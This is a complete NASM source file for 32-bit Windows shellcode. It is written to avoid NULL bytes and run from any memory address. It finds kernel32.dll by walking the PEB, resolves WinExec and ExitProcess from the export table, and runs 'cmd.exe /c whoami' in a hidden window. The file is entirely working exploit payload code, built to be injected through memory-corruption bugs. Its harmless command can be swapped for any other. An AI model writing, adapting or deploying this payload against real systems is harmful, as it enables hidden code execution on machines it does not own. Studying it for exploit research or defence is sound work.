; position independent non-NULL shellcode
BITS 32
section .text
global _start

_start:
  jmp start                        ; jump to program start (keeps PIC offsets from having NULLs)
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; get_address(1, 2, 3)
;   [esp + 0xC] = (3) strlen(function string)
;   [esp + 0x8] = (2) pointer to function string to look for
;   [esp + 0x4] = (1) DLL base address
;   [esp + 0x0] = return address from call
;   - returns in eax the virtual address of the function from the DLL provided
;   - all registers are caller saved except for ebp/esp
;   - caller responsible for stack cleanup
;   - does not modify arguments passed in on the stack
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
get_address:
  mov  eax, [esp + 0x4]            ; get DLL base address
  mov  ebx, [eax + 0x3C]           ; get RVA of PE header
  add  ebx, eax                    ; get virtual address of PE header
  mov  ebx, [ebx + 0x78]           ; get RVA of export table in PE header
  add  ebx, eax                    ; get virtual address of export table
  mov  edx, [ebx + 0x20]           ; get RVA of name pointer table in export table
  add  edx, eax                    ; get virtual address of name pointer table
  mov  eax, [ebx + 0x18]           ; get number of exported *named* functions from export table
.loop:                             ; loop through name pointer table backwards
  dec  eax                         ; go to the next name pointer
  mov  ecx, [esp + 0xC]            ; get length of target string
  mov  edi, [esp + 0x8]            ; get pointer to target string
  mov  esi, [edx + (eax * 0x4)]    ; get RVA of next pointer from name table (entries are 4 bytes long)
  add  esi, [esp + 0x4]            ; get virtual address of next pointer from name table 
  repe cmpsb                       ; compare till ecx = 0 or hit a NULL byte
  jnz  get_address.loop            ; if ecx != 0, then keep looping
  mov  esi, [ebx + 0x24]           ; get the RVA of the ordinal table in export table
  add  esi, [esp + 0x4]            ; get the virtual address of the ordinal table
  mov  ax,  [esi + (eax * 0x2)]    ; get the ordinal number of the target function from the ordinal table (entries are 2 bytes long)
  mov  esi, [ebx + 0x1C]           ; get RVA of address table in export table
  add  esi, [esp + 0x4]            ; get the virtual address of the address table
  mov  eax, [esi + (eax * 0x4)]    ; get the RVA of the target function
  add  eax, [esp + 0x4]            ; get the virtual address of the target function
  ret
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; main routine:
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
start:
  xor  ebp, ebp                    ; keep ebp as constant NULL for program
  mov  ebx, [fs:ebp + 0x30]        ; get address of PEB from TEB
  mov  ebx, [ebx + 0xC]            ; get pointer to PEB_LDR_DATA in PEB
  mov  ebx, [ebx + 0x14]           ; get pointer to LDR_MODULE[0] from Flink of InMemoryOrderModuleList in PEB_LDR_DATA
  mov  ebx, [ebx]                  ; get pointer to ntdll.dll
  mov  ebx, [ebx]                  ; get pointer to kernel32.dll
  mov  ebx, [ebx + 0x10]           ; get pointer to BaseAddress of kernel32.dll
  push WinExec.len
  jmp  WinExec 
_WinExec:
  push ebx 
  call get_address                 ; get_address(kernel32.dll, 'WinExec', strlen('WinExec'))
  push ebp                         ; push SW_HIDE (WinExec argument #2)
  jmp  cmd
_cmd:
  mov  esi, [esp] 
  mov  word [esi + cmd.len], bp    ; get message pointer and add NULL termination to string
  call eax                         ; WinExec(cmd, SW_HIDE(0))
  push ExitProcess.len
  jmp  ExitProcess
_ExitProcess:
  mov  ebx, [esp + 0xC]            ; load kernel32.dll address off of stack from call to 1st get_address()
  push ebx
  call get_address                 ; get_address(kernel32.dll, "ExitProcess", strlen("ExitProcess"))
  push ebp
  call eax                         ; ExitProcess(0)

; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; position independent code (PIC) data:
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

WinExec:
  call  _WinExec
.string:
  ; https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec
  db "WinExec"
.len: equ $ - WinExec.string

cmd:
  call _cmd
.string:
  db "cmd.exe /c whoami", 0x30, 0x30 ; NULL byte set at runtime (with a store WORD not BYTE)
.len: equ $ - cmd.string - 0x2       ; 2 byte offset to point to first temp 0x30 byte

ExitProcess:
  call _ExitProcess
.string:
  ; https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess
  db "ExitProcess"
.len: equ $ - ExitProcess.string
